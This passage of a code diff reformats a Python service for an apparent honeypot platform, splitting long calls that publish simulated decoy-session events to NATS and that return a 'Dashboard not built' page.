+                    "cicdecoy.decoy.events.command.exec",
+                    json.dumps(
+                        _make_raw_event(
+                            "command.exec",
+                            session_id,
+                            src_ip,
+                            username,
+                            decoy_name,
+                            now + timedelta(seconds=elapsed),
+                            cmd,
+                            geo,
+                        )
+                    ).encode(),
+                )
             elapsed += random.randint(1, 5)
-            await nc.publish("cicdecoy.decoy.events.session.end", json.dumps(_make_raw_event("session.end", session_id, src_ip, username, decoy_name, now + timedelta(seconds=elapsed), geo=geo)).encode())
+            await nc.publish(
+                "cicdecoy.decoy.events.session.end",
+                json.dumps(
+                    _make_raw_event(
+                        "session.end",
+                        session_id,
+                        src_ip,
+                        username,
+                        decoy_name,
+                        now + timedelta(seconds=elapsed),
+                        geo=geo,
+                    )
+                ).encode(),
+            )
         except Exception as e:
             return {"status": "error", "detail": f"NATS publish failed: {e}"}
         return {"status": "ok", "session_id": session_id, "events": len(commands) + 3, "source_ip": src_ip}
@@ -1182,4 +1505,6 @@ async def serve_spa(full_path: str):
     index_path = STATIC_DIR / "index.html"
     if index_path.exists():
         return FileResponse(str(index_path))
-    return HTMLResponse("<h1>Dashboard not built</h1><p>Run <code>npm run build</code> in the dashboard directory.</p>", status_code=404)
+    return HTMLResponse(
+        "<h1>Dashboard not built</h1><p>Run <code>npm run build</code> in the dashboard directory.</p>", status_code=404
+    )
